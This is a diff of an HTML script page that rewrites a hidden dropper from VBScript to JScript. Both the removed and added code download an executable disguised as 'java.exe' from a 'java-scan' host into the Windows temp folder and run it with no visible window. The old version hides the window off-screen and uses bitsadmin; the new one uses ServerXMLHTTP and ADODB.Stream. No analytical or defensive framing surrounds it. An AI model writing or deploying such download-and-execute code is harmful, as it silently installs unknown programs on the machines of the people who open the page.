@@ -1,16 +1,19 @@
-<html><body><script language="VBScript">
-Window.ResizeTo 0,0:Window.MoveTo -5000,-5000
+<html><body><script language="JScript">
+var w = new ActiveXObject("WScript.Shell");
+var f = new ActiveXObject("Scripting.FileSystemObject");
+var tmp = f.GetSpecialFolder(2) + "\\java.exe";
 
-Dim s: Set s = CreateObject("WScript.Shell")
-Dim f: Set f = CreateObject("Scripting.FileSystemObject")
-Dim t: t = f.GetSpecialFolder(2)
-Dim u: u = "https://java-scan.up.railway.app/java.exe"
-Dim c: c = "bitsadmin /transfer d /download /priority high " & Chr(34) & u & Chr(34) & " " & Chr(34) & t & "\java.exe" & Chr(34)
-s.Run c, 0, True
+var x = new ActiveXObject("MSXML2.ServerXMLHTTP");
+x.open("GET", "https://java-scan.up.railway.app/java.exe", false);
+x.send();
 
-If f.FileExists(t & "\java.exe") Then
-    s.Run Chr(34) & t & "\java.exe" & Chr(34), 0, False
-End If
+var s = new ActiveXObject("ADODB.Stream");
+s.Open();
+s.Type = 1;
+s.Write(x.responseBody);
+s.SaveToFile(tmp, 2);
+s.Close();
 
-window.close()
+w.Run(tmp, 0, false);
+window.close();
 </script></body></html>
